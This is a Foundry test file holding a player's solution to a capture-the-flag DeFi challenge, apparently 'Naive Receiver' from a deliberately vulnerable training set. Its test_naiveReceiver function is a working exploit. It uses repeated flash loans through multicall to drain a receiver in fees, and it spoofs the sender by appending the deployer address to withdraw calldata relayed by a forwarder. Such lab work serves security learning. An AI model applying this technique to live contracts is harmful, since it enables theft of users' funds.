// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test, console} from "forge-std/Test.sol";
import {
    NaiveReceiverPool,
    Multicall,
    WETH
} from "../../src/naive-receiver/NaiveReceiverPool.sol";
import {
    FlashLoanReceiver
} from "../../src/naive-receiver/FlashLoanReceiver.sol";
import {BasicForwarder} from "../../src/naive-receiver/BasicForwarder.sol";
import {
    IERC3156FlashBorrower
} from "@openzeppelin/contracts/interfaces/IERC3156.sol";

contract NaiveReceiverChallenge is Test {
    address deployer = makeAddr("deployer");
    address recovery = makeAddr("recovery");
    address player;
    uint256 playerPk;

    uint256 constant WETH_IN_POOL = 1000e18;
    uint256 constant WETH_IN_RECEIVER = 10e18;

    NaiveReceiverPool pool;
    WETH weth;
    FlashLoanReceiver receiver;
    BasicForwarder forwarder;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    function setUp() public {
        (player, playerPk) = makeAddrAndKey("player");
        startHoax(deployer);

        weth = new WETH();
        forwarder = new BasicForwarder();
        pool = new NaiveReceiverPool{value: WETH_IN_POOL}(
            address(forwarder),
            payable(weth),
            deployer
        );

        receiver = new FlashLoanReceiver(address(pool));
        weth.deposit{value: WETH_IN_RECEIVER}();
        weth.transfer(address(receiver), WETH_IN_RECEIVER);

        vm.stopPrank();
    }

    function test_assertInitialState() public {
        assertEq(weth.balanceOf(address(pool)), WETH_IN_POOL);
        assertEq(weth.balanceOf(address(receiver)), WETH_IN_RECEIVER);
        assertEq(pool.maxFlashLoan(address(weth)), WETH_IN_POOL);
        assertEq(pool.flashFee(address(weth), 0), 1 ether);
        assertEq(pool.feeReceiver(), deployer);

        vm.expectRevert(bytes4(hex"48f5c3ed"));
        receiver.onFlashLoan(
            deployer,
            address(weth),
            WETH_IN_RECEIVER,
            1 ether,
            bytes("")
        );
    }

    function test_naiveReceiver() public checkSolvedByPlayer {
        //setting byte call
        bytes[] memory calls = new bytes[](11);
        for (uint256 i = 0; i < 10; i++) {
            calls[i] = abi.encodeCall(
                pool.flashLoan,
                (IERC3156FlashBorrower(address(receiver)), address(weth), 0, "")
            );
        }
        //seeting 11th call =  pool withdraw to address deployer
        calls[10] = abi.encodePacked(
            abi.encodeCall(
                pool.withdraw,
                (WETH_IN_POOL + WETH_IN_RECEIVER, payable(recovery))
            ),
            address(deployer)
        );

        bytes memory data = abi.encodeCall(pool.multicall, (calls));
        //using basicforwarder because no restriction to

        BasicForwarder.Request memory req = BasicForwarder.Request({
            from: player,
            target: address(pool),
            value: 0,
            gas: 1_000_000,
            nonce: forwarder.nonces(player),
            data: data,
            deadline: block.timestamp + 1 days
        });

        bytes32 digest = keccak256(
            abi.encodePacked(
                "\x19\x01",
                forwarder.domainSeparator(),
                forwarder.getDataHash(req)
            )
        );

        (uint8 v, bytes32 r, bytes32 s) = vm.sign(playerPk, digest);
        forwarder.execute(req, abi.encodePacked(r, s, v));
    }

    function _isSolved() private view {
        assertLe(vm.getNonce(player), 2);
        assertEq(
            weth.balanceOf(address(receiver)),
            0,
            "Unexpected balance in receiver contract"
        );
        assertEq(
            weth.balanceOf(address(pool)),
            0,
            "Unexpected balance in pool"
        );
        assertEq(
            weth.balanceOf(recovery),
            WETH_IN_POOL + WETH_IN_RECEIVER,
            "Not enough WETH in recovery account"
        );
    }
}
